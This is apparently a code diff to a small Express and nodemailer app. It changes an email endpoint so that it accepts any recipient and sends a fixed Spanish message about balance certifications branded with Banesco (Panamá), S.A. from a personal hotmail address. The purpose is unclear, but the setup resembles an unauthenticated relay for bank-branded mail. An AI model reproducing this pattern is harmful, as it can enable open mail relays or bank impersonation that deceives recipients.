@@ -24,13 +24,13 @@ const transporter = nodemailer.createTransport({
 });
 
 app.post('/enviar-correo', (req, res) => {
-    const { to, subject, message } = req.body;
+    const { to} = req.body;
   
     const mailOptions = {
       from: 'obed8perez@hotmail.com',
       to,
-      subject,
-      text: message,
+      subject: 'Certificaciones de saldo Banesco (Panamá), S.A.',
+      text: 'Por este medio hacemos de su conocimiento que se le está enviando un grupo de certificaciones de saldo con su debido sustento, para su revisión y posterior refrendo.',
     };
   
     transporter.sendMail(mailOptions, (error, info) => {
@@ -44,7 +44,7 @@ app.post('/enviar-correo', (req, res) => {
     });
   });
   app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.sendFile(path.join(__dirname, 'public', 'formulario2.html'));
   });
 app.listen(PORT, () => {
     console.log(`Servidor escuchando en el puerto ${PORT}`);
